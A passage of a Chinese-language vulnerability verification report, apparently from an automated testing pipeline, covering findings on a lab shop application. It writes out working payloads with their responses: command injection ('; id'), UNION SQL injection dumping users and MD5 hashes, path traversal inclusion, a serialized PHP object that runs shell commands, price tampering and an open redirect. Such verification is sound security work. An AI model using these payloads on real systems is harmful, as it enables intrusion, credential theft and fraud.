  - 复核观测：正常侧 GET /ops/batch-check.php?host=127.0.0.1（operator 会话）返回 200，<pre> 内容仅为 ping 127.0.0.1 的正常统计信息（1 packets transmitted, 1 received），不含注入标记 POC_MARK_9f3a2b。；攻击侧 GET /ops/batch-check.php?host=127.0.0.1%3B%20echo%20POC_MARK_9f3a2b%3B%20id（同一 operator 会话）返回 200，<pre> 在 ping 统计后额外输出 "POC_MARK_9f3a2b" 与 "uid=33(www-data) gid=33(www-data) groups=33(www-data)"，即注入的 echo/id 命令被执行并回显；MARKER_IN_NORMAL_PRE=False，MARKER_IN_ATTACK_PRE=True。

### C-10 订单详情仅按请求 id 查询，任意登录用户可读取他人订单

- verification `8cd5e936eb0b4e98bd6ecc64b460b4b2`（finding `13a0f5bed6414ab0948f6f25117d47f5` revision 1，context `ed44812d3715440a9ffc8274c1864650`，target lab30-shop-1.0.0）
  - 执行状态：验证实验因模型或运行时异常中断，已保存作业，结论仍未决；判定：不确定；来源：poc_agent
  - 正常侧观测：未记录
  - 攻击侧观测：未记录
  - 已保存作业事实：4 个；满足执行及前提检查的作业：4 个。作业完成不等同于漏洞成立。
  - 结论未完整发布；缺少正常／攻击侧发布内容不代表没有执行观测。
  - 已观测作业 ID：`769ba3fdb3834216b86da7e890498668`；`b966b9fc4dd94c908a3c7dd6b68b17f0`；`e660739688c44a0a937b939a49aa80a9`；`b3daf734f67b448daf59927589133133`
  - 结论结束原因：sdk_api_error；执行阶段结束原因：sdk_api_error
  - 作业：`769ba3fdb3834216b86da7e890498668` http finished exit=0；`b966b9fc4dd94c908a3c7dd6b68b17f0` http finished exit=0；`e660739688c44a0a937b939a49aa80a9` http finished exit=0；`b3daf734f67b448daf59927589133133` http finished exit=0

- verification `0ace6041951a43b38b781de80a747b46`（finding `13a0f5bed6414ab0948f6f25117d47f5` revision 1，context `315dfe059bc142d6acde10af74410568`，target lab30-shop-1.0.0）
  - 执行状态：验证实验因模型或运行时异常中断，已保存作业，结论仍未决；判定：不确定；来源：poc_agent
  - 正常侧观测：未记录
  - 攻击侧观测：未记录
  - 已保存作业事实：1 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 结论未完整发布；缺少正常／攻击侧发布内容不代表没有执行观测。
  - 已观测作业 ID：`24e9f4abef2748de84d5795562c06dd4`
  - 结论结束原因：sdk_api_error；执行阶段结束原因：sdk_api_error
  - 作业：`24e9f4abef2748de84d5795562c06dd4` script finished exit=0

- verification `79c207c526484af5aeaa8402b54554c7`（finding `13a0f5bed6414ab0948f6f25117d47f5` revision 1，context `315dfe059bc142d6acde10af74410568`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：operator
  - 正常侧观测：alice 自有订单索引只有 id=1；以该身份读取 id=1 返回 user_id=1 与 alice 私有配送备注。
  - 攻击侧观测：保持 alice 会话，只把详情 id 改为2，200 返回 user_id=2、username=bob、BOB_PRIVATE_ORDER_gift_for_family；不存在的 id=3..20 返回404。
  - 已保存作业事实：1 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 结论未完整发布；缺少正常／攻击侧发布内容不代表没有执行观测。
  - 已观测作业 ID：`24e9f4abef2748de84d5795562c06dd4`
  - 结论结束原因：operator_review_completed；执行阶段结束原因：sdk_api_error
  - 作业：`24e9f4abef2748de84d5795562c06dd4` script finished exit=0
  - 备注：恢复已结束的原脚本输出，不重放请求。仅证明跨用户订单读取，未推断修改订单或数据库写入。

- 正式复核 `1ce94862fca74876a1a919ea9a5af8fa`：复核确认；引用 revision 1 / verification `79c207c526484af5aeaa8402b54554c7`
  - 理由：正常侧 CONTROL：同一 alice 会话 GET detail.php?id=1 返 200，返回 user_id=1、username=alice 与 ALICE_PRIVATE_ORDER 备注；攻击侧 ATTACK：仅把 id 改为 2，在同一会话下返 200，返回 user_id=2、username=bob、BOB_PRIVATE_ORDER_gift_for_family，id=3..20 均 404。与 detail.php:2 仅按 $_GET['id'] 查询、缺 user_id 归属约束以及第 3/4 行回显字段一致，且 404 反证返回数据确由请求 id 决定，越权读取他人订单及私有备注成立。
  - 复核观测：正常侧 alice 自有订单索引只有 id=1；以该身份读取 id=1 返回 user_id=1 与 alice 私有配送备注。；攻击侧 保持 alice 会话，只把详情 id 改为2，200 返回 user_id=2、username=bob、BOB_PRIVATE_ORDER_gift_for_family；不存在的 id=3..20 返回404。

### C-11 注册与登录链路口令使用无盐 MD5 弱哈希

- verification `ec31bf54dec347149baf8cb08931a283`（finding `0bed78e56e8045e9bffdfb21970489eb` revision 1，context `0458e66f42a14e23acfc92678ceba31a`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：job 33da8acd727d4c71be08310a90adf56b（guest）：poc41430ca/b/c 经 /auth/register.php 注册均返回 200 且含“注册成功”；三者用各自口令登录均成功并跳转 http://lab30/；poc41430ca 用错误口令 "wrongpass123" 登录返回 401。脚本本地计算 md5("password")=5f4dcc3b5aa765d61d8327deb882cf99、md5("zzzqwerty9")=f18923017775f552d7255b0e076cd04c，展示相同口令的期望摘要。
  - 攻击侧观测：job 8fabb6017e634a95b88b7e4a9a340a4d（operator，/ops/members.php 正常查询 q=poc41430c 仅返回 id/username/email/role，无摘要；随后 q 改为 UNION SELECT id,username,password_md5,role FROM users-- -，读回全部 users 摘要）：poc41430ca 与 poc41430cb（同为口令 "password"）的 password_md5 均为 5f4dcc3b5aa765d61d8327deb882cf99，poc41430cc（"zzzqwerty9"）为 f18923017775f552d7255b0e076cd04c；既有 alice/bob/operator/admin 摘要分别为 05b8dbe9…、407fd7e7…、fc252aaf…、2637a5c3…，全部为 32 位十六进制裸值，无盐、无 $2y$/$argon 前缀。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `fc354ac7943a489f92ee5b1acd4a5631`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`33da8acd727d4c71be08310a90adf56b`；`8fabb6017e634a95b88b7e4a9a340a4d`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`33da8acd727d4c71be08310a90adf56b` script finished exit=0；`8fabb6017e634a95b88b7e4a9a340a4d` script finished exit=0
  - 适配脚本：`ec31bf54-adapted-poc.php`（见证据包 evidence/）
  - 备注：正常侧证据 ev-5060f93ad1a7aac4（job 33da8acd727d4c71be08310a90adf56b stdout 全文）：三个账户注册成功、正确口令登录跳转 http://lab30/、错误口令 401，脚本本地计算 md5("password")=5f4dcc3b5aa765d61d8327deb882cf99、md5("zzzqwerty9")=f18923017775f552d7255b0e076cd04c。攻击侧证据 ev-efd741707f813ddc（job 8fabb6017e634a95b88b7e4a9a340a4d stdout 全文）：UNION 读回的摘要与上述本地 md5 完全一致，两个同口令账户摘要相同。源码 applicability=match：register.php 第8行 md5($password) 入库；login.php 第7行 hash_equals(库值, md5(输入))。

- 正式复核 `8914a95ecac3454bab941843ee0ea26e`：复核确认；引用 revision 1 / verification `ec31bf54dec347149baf8cb08931a283`
  - 理由：正常侧作业 33da8acd：poc41430ca/b/c 注册成功（200 含注册成功），各自口令登录成功并跳转 http://lab30/，poc41430ca 错误口令返回 401，说明认证按摘要正确工作；攻击侧作业 8fabb601：poc41430ca 与 poc41430cb 同口令 password 摘要均为 5f4dcc3b5aa765d61d8327deb882cf99，等于脚本本地 md5(password)，poc41430cc 摘要等于 md5(zzzqwerty9)，既有账户亦为 32 位裸值，同口令同摘要且等于快速无盐 md5，直接反证随机盐 KDF，与 register.php:8 的 md5($password) 写入及 login.php:7 的 md5 比对一致。摘要经 operator UNION 注入读回属前提模拟，不影响根因判读。
  - 复核观测：正常侧 job 33da8acd727d4c71be08310a90adf56b（guest）：poc41430ca/b/c 经 /auth/register.php 注册均返回 200 且含“注册成功”；三者用各自口令登录均成功并跳转 http://lab30/；poc41430ca 用错误口令 "wrongpass123" 登录返回 401。脚本本地计算 md5("password")=5f4dcc3b5aa765d61d8327deb882cf99、md5("zzzqwerty9")=f18923017775f552d7255b0e076cd04c，展示相同口令的期望摘要。；攻击侧 job 8fabb6017e634a95b88b7e4a9a340a4d（operator，/ops/members.php 正常查询 q=poc41430c 仅返回 id/username/email/role，无摘要；随后 q 改为 UNION SELECT id,username,password_md5,role FROM users-- -，读回全部 users 摘要）：poc41430ca 与 poc41430cb（同为口令 "password"）的 password_md5 均为 5f4dcc3b5aa765d61d8327deb882cf99，poc41430cc（"zzzqwerty9"）为 f18923017775f552d7255b0e076cd04c；既有 alice/bob/operator/admin 摘要分别为 05b8dbe9…、407fd7e7…、fc25…

### C-12 continue.php 的 next 参数写入 Location 头导致开放重定向

- verification `02d0e03a2f724f39bc1b5ce3a340bb5a`（finding `9ef964fa5f354f918d4924183aadfe11` revision 1，context `70383308693541e98c72cbe41e18ad59`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：alice 身份 GET /auth/continue.php?next=%2Forders%2Findex.php：HTTP 302，响应头 location: /orders/index.php（job b0d9c29d38234b6299d08ed2853645af，exit 0）。仅跳转到站内路径。
  - 攻击侧观测：alice 身份 GET /auth/continue.php?next=https%3A%2F%2Fattacker.example%2Fphish：HTTP 302，响应头 location: https://attacker.example/phish（job 7b8d8016f58d4d5c88d6d1b680323b71，exit 0）。外部受控源被原样接受为跳转目标。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `a128b909a18b4d8bad1fcbc30f4c548f`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`b0d9c29d38234b6299d08ed2853645af`；`7b8d8016f58d4d5c88d6d1b680323b71`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`b0d9c29d38234b6299d08ed2853645af` http finished exit=0；`7b8d8016f58d4d5c88d6d1b680323b71` http finished exit=0
  - 备注：两侧均为 alice 身份、同一上下文、同一接口与 GET 方法，唯一差异是 next 参数值（站内相对路径 vs 外部绝对 URL）。作业 precondition ok=true，无状态变化。诊断返回 capability_unavailable（http 作业未启用采集），不作为漏洞成立的依据。

- 正式复核 `471796a5b2b64a2ea5786e81814c6c2c`：复核确认；引用 revision 1 / verification `02d0e03a2f724f39bc1b5ce3a340bb5a`
  - 理由：正常侧 alice 访问 next=%2Forders%2Findex.php 返回 302 且 Location 为站内 /orders/index.php；攻击侧仅改变 next 为 https://attacker.example/phish，同一接口返回 302 且 Location 原样为外部 URL。两侧唯一差异是 next 取值，证明服务端无协议/主机白名单，开放重定向根因成立。局限为隔离环境未做真实浏览器跨站导航，结论基于服务端响应头原文，不影响源码层面判定。
  - 复核观测：正常侧 alice 身份 GET /auth/continue.php?next=%2Forders%2Findex.php：HTTP 302，响应头 location: /orders/index.php（job b0d9c29d38234b6299d08ed2853645af，exit 0）。仅跳转到站内路径。；攻击侧 alice 身份 GET /auth/continue.php?next=https%3A%2F%2Fattacker.example%2Fphish：HTTP 302，响应头 location: https://attacker.example/phish（job 7b8d8016f58d4d5c88d6d1b680323b71，exit 0）。外部受控源被原样接受为跳转目标。

### C-13 订单创建价格取自客户端 POST，未按服务端商品价格重算导致价格篡改

- verification `f72d03dc0191487aa1fd88c896699c8c`（finding `0a1bf6e3f513469fa4f9d3cc9bc8af7c` revision 1，context `bcf111b5d4d3431483f308bbe5442a9a`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：job 6981e2c6d70e4192a47db49ca242ec75（alice）：商品1 晨光手冲壶 页面标价/隐藏 price=129.00，库存 50；POST /orders/create.php product_id=1&quantity=1&price=129.00&csrf=<页面取得> 返回 303 Location /orders/detail.php?id=3；以 Accept: application/json 读回订单3：unit_price="129.00"、total="129.00"；库存变为 49。即订单金额与商品标价一致。
  - 攻击侧观测：job 6963855d2991492287203027b1f6bfae（alice）：同一商品1，服务端标价仍为 129.00，库存 49；仅将 POST 的 price 改为 0.01，其余 product_id=1&quantity=1 与页面取得的 csrf 不变，返回 303 Location /orders/detail.php?id=4；读回订单4：unit_price="0.01"、total="0.01"；库存扣减为 48。客户端可控价格被接受并写库、扣库存，与正常侧 129.00 形成直接差异。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `ad71bb175fff4f21b275257e4fb2551f`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`6981e2c6d70e4192a47db49ca242ec75`；`6963855d2991492287203027b1f6bfae`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`6981e2c6d70e4192a47db49ca242ec75` script finished exit=0；`6963855d2991492287203027b1f6bfae` script finished exit=0
  - 适配脚本：`f72d03dc-adapted-poc.php`（见证据包 evidence/）
  - 备注：正常侧证据 ev-ad9409109d186748（job 6981e2c6d70e4192a47db49ca242ec75 stdout 全文）；攻击侧证据 ev-af38b0008d96d233（job 6963855d2991492287203027b1f6bfae stdout 全文）。源码窗 applicability=match：create.php 第3行 $_POST['price']→$price，第4行仅非负校验，第5行 $total=$price*$quantity，第7行写入 orders(unit_price,total)；$p 取自 products 但未用于定价。detail.php 第2-3行按 id 读取并以 JSON 回显订单，作为写入读回。

- 正式复核 `e2a5fb7bbb1f4d418bcf2854c258022b`：复核确认；引用 revision 1 / verification `f72d03dc0191487aa1fd88c896699c8c`
  - 理由：双侧观测一致且可区分：正常侧（job 6981e2c6…）price=129.00 提交得订单3，详情 unit_price/total=129.00，库存 50→49；攻击侧（job 6963855d…）仅将 price 改为 0.01，得订单4，详情 unit_price="0.01"、total="0.01"，库存 49→48。仅 price 变量不同即令订单金额由 129.00 变为 0.01，直接反证服务端按 products.price 重算，与 create.php:3-7 源码静态分析一致，动态确认成立。
  - 复核观测：正常侧 job 6981e2c6d70e4192a47db49ca242ec75（alice）：商品1 晨光手冲壶 页面标价/隐藏 price=129.00，库存 50；POST /orders/create.php product_id=1&quantity=1&price=129.00&csrf=<页面取得> 返回 303 Location /orders/detail.php?id=3；以 Accept: application/json 读回订单3：unit_price="129.00"、total="129.00"；库存变为 49。即订单金额与商品标价一致。；攻击侧 job 6963855d2991492287203027b1f6bfae（alice）：同一商品1，服务端标价仍为 129.00，库存 49；仅将 POST 的 price 改为 0.01，其余 product_id=1&quantity=1 与页面取得的 csrf 不变，返回 303 Location /orders/detail.php?id=4；读回订单4：unit_price="0.01"、total="0.01"；库存扣减为 48。客户端可控价格被接受并写库、扣库存，与正常侧 129.00 形成直接差异。

### C-14 内容中心 page 参数直接拼接进 include 导致本地文件包含

- verification `f2adbc3e59b14e358497e171f812efef`（finding `f6a24603a7a941f3a62f5034c1b46b82` revision 1，context `beac3d978b274f61ad0905324793e473`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常对照 1（job c0b4f8b5697641de8a391fd06bd430f2，guest）：GET /content/page.php?page=home 返回 200、content-length 943，正文含商城介绍面板、商城介绍/配送与售后链接及完整页脚。正常对照 2（job 2d808f55f8de4f008f7a7de6db3d9df8，guest）：GET /content/page.php?page=..%2F..%2Fsrc%2Fno_such_1deaaee6 返回 200、content-length 810，正文含链接与页脚并正常闭合，说明不存在的包含目标只产生被抑制的 include 警告后继续执行。
  - 攻击侧观测：攻击（job 2079be416c8a4b09b50f4be547723c17，guest）：GET /content/page.php?page=..%2F..%2Fsrc%2Fbootstrap 返回 200、content-length 688，正文自 <h1>内容中心</h1> 后立即结束，未出现视图内容、商城介绍/配送链接或页脚，响应在 include 调用处终止。该路径从 views 上跳两级即 app/src/bootstrap.php（与 page.php 第 2 行 require 的同一文件），其函数与常量已定义，重复 include 造成致命错误。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `0702309a588b4d28b7fe04bc64871f27`；本次未重新执行该历史作业。
  - 已保存作业事实：4 个；满足执行及前提检查的作业：4 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`099cc17a89214f198a85cb66753f7cf7`；`c0b4f8b5697641de8a391fd06bd430f2`；`2079be416c8a4b09b50f4be547723c17`；`2d808f55f8de4f008f7a7de6db3d9df8`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`c0b4f8b5697641de8a391fd06bd430f2` http finished exit=0；`2079be416c8a4b09b50f4be547723c17` http finished exit=0；`2d808f55f8de4f008f7a7de6db3d9df8` http finished exit=0；`099cc17a89214f198a85cb66753f7cf7` script finished exit=0
  - 适配脚本：`f2adbc3e-adapted-lfi_content_page.py`（见证据包 evidence/）
  - 备注：ev-b3d74a8f…/ev-667397c6… 为 page=home 的正文与 943 字节头；ev-7ed0001f…/ev-60255b45… 为不存在穿越目标的正文（含链接与页脚）与 810 字节头；ev-cc2c2a2a…/ev-8784076e… 为 page=../../src/bootstrap 的正文（止于标题）与 688 字节头。正常与攻击作业均为 guest、同一上下文、同一入口与 GET 方法，唯一变量是 page 值。宿主此前的一次脚本执行 099cc17a89214f198a85cb66753f7cf7 使用多一级的 ../../../src/bootstrap 并只记录相同前缀，不作为本结论依据。诊断 capability_unavailable，未取得服务端致命错误文本。

- 正式复核 `22d2862746834e48a1b78b8eb8b42b57`：复核确认；引用 revision 1 / verification `f2adbc3e59b14e358497e171f812efef`
  - 理由：双侧判读可复核：正常 page=home（job c0b4f8b5697641de8a391fd06bd430f2）返回 200/943 字节，含商城介绍面板、home/shipping 链接与页脚；同形穿越但目标不存在的 ../../src/no_such（job 2d808f55f8de4f008f7a7de6db3d9df8）返回 200/810 字节仍含链接与页脚，说明未命中仅产生被抑制的 include 警告后继续。攻击 page=../../src/bootstrap（job 2079be416c8a4b09b50f4be547723c17）返回 200/688 字节，正文止于 <h1>内容中心</h1>，缺视图区块、链接与页脚，与 bootstrap.php 已在入口 require 造成重复声明致命错误一致，证明 include 操作数被 ../ 穿越并编译了目录外已存在 PHP 文件；guest 身份即可触发。限制：拼接强制 .php 后缀、未演示任意文本读取，服务端诊断不可用未捕获错误文本；不推翻穿越与编译执行事实。
  - 复核观测：正常侧 正常对照 1（job c0b4f8b5697641de8a391fd06bd430f2，guest）：GET /content/page.php?page=home 返回 200、content-length 943，正文含商城介绍面板、商城介绍/配送与售后链接及完整页脚。正常对照 2（job 2d808f55f8de4f008f7a7de6db3d9df8，guest）：GET /content/page.php?page=..%2F..%2Fsrc%2Fno_such_1deaaee6 返回 200、content-length 810，正文含链接与页脚并正常闭合，说明不存在的包含目标只产生被抑制的 include 警告后继续执行。；攻击侧 攻击（job 2079be416c8a4b09b50f4be547723c17，guest）：GET /content/page.php?page=..%2F..%2Fsrc%2Fbootstrap 返回 200、content-length 688，正文自 <h1>内容中心</h1> 后立即结束，未出现视图内容、商城介绍/配送链接或页脚，响应在 include 调用处终止。该路径从 views 上跳两级即 app/src/bootstrap.php（与 page.php 第 2 行 require 的同一文件），其函数与常量已定义，重复 include 造成致命错误。

### C-15 运营网络诊断将 host 参数拼入 shell_exec 造成系统命令注入

- verification `2d57c9e025e04dcaa6e98b0d3e2576ed`（finding `c02fe17575974cbfa0caf32637b482db` revision 1，context `af3d8f6685b545d6aae1f20fa35c979b`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧作业 6e3c0ecdba444e1596144c67bc93e2bb（operator）：登录后 /ops/index.php 返回 200；GET /ops/ping.php?host=127.0.0.1 返回 200，页面标题为网络诊断，NORMAL_FORBIDDEN False，<pre id="diagnostic-output"> 内容为 'PING 127.0.0.1 … 1 received … rtt min/avg/max/mdev = 0.286/0.286/0.286/0.000 ms'，NORMAL_MARKER_IN_OUTPUT False。
  - 攻击侧观测：攻击侧作业 b145bcfd011e478ab08bdae2d9d78a29（operator）：把 host 改为 127.0.0.1; printf 'PWNED-CMD-7Q2Z\n'; id; echo HOME=$HOME 后，页面 200，<pre id="diagnostic-output"> 内容先正常 ping 输出，随后出现 'PWNED-CMD-7Q2Z'、'uid=33(www-data) gid=33(www-data) groups=33(www-data)'、'HOME='——这些是 ping 之外的额外命令产生的输出（MARKER_IN_PRE True、UID_IN_PRE True、HOME_IN_PRE True）。表单 value 中的同一字符串是 h() 转义后的回显，与 pre 内的命令执行输出相区分。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `8b7d1e66a7084689ab4850e6671f809b`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`6e3c0ecdba444e1596144c67bc93e2bb`；`b145bcfd011e478ab08bdae2d9d78a29`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`6e3c0ecdba444e1596144c67bc93e2bb` script finished exit=0；`b145bcfd011e478ab08bdae2d9d78a29` script finished exit=0
  - 适配脚本：`2d57c9e0-adapted-poc.php`（见证据包 evidence/）
  - 备注：源码窗口 applicability=match：ops/ping.php:2 require_user(['operator','admin']) 后 $host=(string)($_GET['host']??'')，直接 shell_exec('ping -c 1 -W 1 '.$host)，无 escapeshellarg/白名单；:3 仅 h($output) 转义输出。operator 身份已由 target_prepare 核验为 role=operator（id=3），与两个作业的实际身份一致。正常侧与攻击侧共用登录、路径、身份，仅 host 参数不同；命令输出限制在 <pre id="diagnostic-output"> 内比较。

- 正式复核 `8c5269898e7a4b1bb149fee9c27fb2ff`：复核确认；引用 revision 1 / verification `2d57c9e025e04dcaa6e98b0d3e2576ed`
  - 理由：两侧作业可判读：正常侧 6e3c0ecdba444e1596144c67bc93e2bb（operator）GET host=127.0.0.1 返回 200，pre 仅标准 ping 输出，NORMAL_MARKER_IN_OUTPUT False；攻击侧 b145bcfd011e478ab08bdae2d9d78a29（operator）host=127.0.0.1; printf 'PWNED-CMD-7Q2Z\n'; id; echo HOME=$HOME 返回 200，pre 在 ping 结果后出现唯一标记 PWNED-CMD-7Q2Z 与 uid=33(www-data) gid=33(www-data)，MARKER_IN_PRE/UID_IN_PRE True，表单 value 的转义回显与 pre 内命令输出明确区分。与源码 ping.php:2 未转义拼接 shell_exec 一致，命令注入被实际证实。
  - 复核观测：正常侧 正常侧作业 6e3c0ecdba444e1596144c67bc93e2bb（operator）：登录后 /ops/index.php 返回 200；GET /ops/ping.php?host=127.0.0.1 返回 200，页面标题为网络诊断，NORMAL_FORBIDDEN False，<pre id="diagnostic-output"> 内容为 'PING 127.0.0.1 … 1 received … rtt min/avg/max/mdev = 0.286/0.286/0.286/0.000 ms'，NORMAL_MARKER_IN_OUTPUT False。；攻击侧 攻击侧作业 b145bcfd011e478ab08bdae2d9d78a29（operator）：把 host 改为 127.0.0.1; printf 'PWNED-CMD-7Q2Z\n'; id; echo HOME=$HOME 后，页面 200，<pre id="diagnostic-output"> 内容先正常 ping 输出，随后出现 'PWNED-CMD-7Q2Z'、'uid=33(www-data) gid=33(www-data) groups=33(www-data)'、'HOME='——这些是 ping 之外的额外命令产生的输出（MARKER_IN_PRE True、UID_IN_PRE True、HOME_IN_PRE True）。表单 value 中的同一字符串是 h() 转义后的回显，与 pre 内的命令执行输出相区分。

### C-16 商品目录搜索参数 q 拼接进 LIKE 查询导致 SQL 注入

- verification `88f50cddcc1640c197e49d4faa4db9be`（finding `1895fbd0583d46348f4a8dbd81236b9b` revision 1，context `fc18737ccdd34561b1083a3ec236fe84`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：作业 d0713786cc8a40778c76bb1a9533c69d（guest）：GET /catalog/index.php 基线 200，result-count=4，商品 ['晨光手冲壶','山野帆布包','周末香氛蜡烛','留白手账本']，页面无 PWNED-SQLI-7Q2Z；q=zzzz-no-such-product 返回 200，解析 ('0', [])，q 只以转义文本出现在搜索框 value；q=晨光手冲壶 返回 200，解析 ('1', ['晨光手冲壶'])。
  - 攻击侧观测：作业 2a093e8f316c4c37ba11361815c0383d（guest，无需登录）：只改 q 参数。q=' UNION SELECT 999,'PWNED-SQLI-7Q2Z','d',1,1,'red'-- - 返回 200，result-count=5，商品 h2 列表为 ['晨光手冲壶','山野帆布包','周末香氛蜡烛','留白手账本','PWNED-SQLI-7Q2Z']，MARKER_AS_PRODUCT_H2 True，注入行描述为 'd'。q=' UNION SELECT 1,username,role,0,0,'red' FROM users WHERE username='alice'-- - 返回 200，结果中出现 <h2>alice</h2> 与 <p>customer</p>（USERS_ALICE_ROW True），即从 users 表读出 username/role。q=' 单独单引号返回 503 错误页（QUOTE_ONLY_STATUS 503），说明引号未过滤并使查询报错。早期作业 431b7b245d44461696630f8202971b29 的 stdout 同样出现 PWNED-SQLI-7Q2Z 注入行，但该作业 exit_code=1 不可用作证据。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `d90a9f14dbf74abc96e91d7a75f0ab64`；本次未重新执行该历史作业。
  - 已保存作业事实：3 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`d0713786cc8a40778c76bb1a9533c69d`；`431b7b245d44461696630f8202971b29`；`2a093e8f316c4c37ba11361815c0383d`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`d0713786cc8a40778c76bb1a9533c69d` script finished exit=0；`2a093e8f316c4c37ba11361815c0383d` script finished exit=0
  - 适配脚本：`88f50cdd-adapted-poc.php`（见证据包 evidence/）
  - 备注：源码窗口 applicability=match：catalog/index.php:3 $term=(string)($_GET['q']??'')，:4 db()->query("... WHERE name LIKE '%".$term."%' ORDER BY id") 直接拼接，无 prepare/占位符；bootstrap.php:6 的 EMULATE_PREPARES=false 对 query() 无作用。页面仅在 input value 中用 h() 转义回显 q（正常侧 NORMAL_ECHOED_VALUE 可见），商品卡片来自 fetchAll() 结果，故注入标记出现在 <h2> 商品标题与 result-count 只能来自 SQL 结果集。正常与攻击均为未登录 guest、同一路径 /catalog/index.php、同一 GET 参数 q。

- 正式复核 `5374e0a3561e49c08b45cdcd067f8d1c`：复核确认；引用 revision 1 / verification `88f50cddcc1640c197e49d4faa4db9be`
  - 理由：正常侧作业 d0713786cc8a40778c76bb1a9533c69d：基线 4 件商品，q=zzzz 得 0 行，q=晨光手冲壶 得 1 行，标记均未出现，q 仅作转义文本出现在输入框，构成有效对照。攻击侧作业 2a093e8f316c4c37ba11361815c0383d（guest）：q=' UNION SELECT 999,'PWNED-SQLI-7Q2Z','d',1,1,'red'-- - 返回 200、5 行且注入行以商品 <h2> 渲染；另一载荷从 users 读出 alice/customer；单独单引号触发 503。结果集随 q 的 SQL 结构改变，确认注入。作业 431b7b245d44461696630f8202971b29 exit_code=1 不采信；写入能力未演示，限于只读影响。
  - 复核观测：正常侧 作业 d0713786cc8a40778c76bb1a9533c69d（guest）：GET /catalog/index.php 基线 200，result-count=4，商品 ['晨光手冲壶','山野帆布包','周末香氛蜡烛','留白手账本']，页面无 PWNED-SQLI-7Q2Z；q=zzzz-no-such-product 返回 200，解析 ('0', [])，q 只以转义文本出现在搜索框 value；q=晨光手冲壶 返回 200，解析 ('1', ['晨光手冲壶'])。；攻击侧 作业 2a093e8f316c4c37ba11361815c0383d（guest，无需登录）：只改 q 参数。q=' UNION SELECT 999,'PWNED-SQLI-7Q2Z','d',1,1,'red'-- - 返回 200，result-count=5，商品 h2 列表为 ['晨光手冲壶','山野帆布包','周末香氛蜡烛','留白手账本','PWNED-SQLI-7Q2Z']，MARKER_AS_PRODUCT_H2 True，注入行描述为 'd'。q=' UNION SELECT 1,username,role,0,0,'red' FROM users WHERE username='alice'-- - 返回 200，结果中出现 <h2>alice</h2> 与 <p>customer</p>（USERS_ALICE_ROW True），即从 users 表读出 use…

### C-17 ops/jobs.php 对 base64 提交数据 unserialize 触发 DispatchJob::__wakeup 内 shell_exec 造成命令执行

- verification `47dac9f45ad34124ae100c5bbdfc75c9`（finding `a41fe4397d1647aca813d15585c09820` revision 1，context `1575a083b5894ce0a8a0cfbfe3a5c67d`，target lab30-shop-1.0.0）
  - 执行状态：未执行；判定：不确定；来源：poc_agent
  - 正常侧观测：未记录
  - 攻击侧观测：未记录
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `7c321830b59c4c0f9af1fc1a51cfa523`；本次未重新执行该历史作业。
  - 结论结束原因：stream_connection_error；执行阶段结束原因：未记录

- verification `64d4749733f947ed9b5391e4d5c9dc76`（finding `a41fe4397d1647aca813d15585c09820` revision 1，context `06ac4fe93bec42eeb9a4aca6dd6456a5`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：operator 登录后 GET /ops/jobs.php 得到表单与 csrf；直接提交页面自带默认载荷（服务端 $example：O:11:"DispatchJob":1:{s:7:"command";s:22:"printf inventory-ready";}）→ POST 200，"任务已导入并执行"，响应 <pre>inventory-ready</pre>，复查页面 jobs 表新行 id=388 details=inventory-ready（只读 GET 再次确认）。
  - 攻击侧观测：同一 operator 会话、同一表单 csrf、同一端点与序列化结构，仅将 command 改为 printf LAB30DSER_5f3a1c（载荷 O:11:"DispatchJob":1:{s:7:"command";s:23:"printf LAB30DSER_5f3a1c";}）→ POST 200，响应 <pre>LAB30DSER_5f3a1c</pre>；随后 GET /ops/jobs.php 读回 jobs 表新行 id=389，details=LAB30DSER_5f3a1c。该唯一标记只可能来自 shell_exec 执行攻击者提供的命令字符串，而非任何表单正常输出。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `aa5aaaa3e99f4b2a9ffa2f7e4cc65428`；本次未重新执行该历史作业。
  - 已保存作业事实：4 个；满足执行及前提检查的作业：3 个。作业完成不等同于漏洞成立。
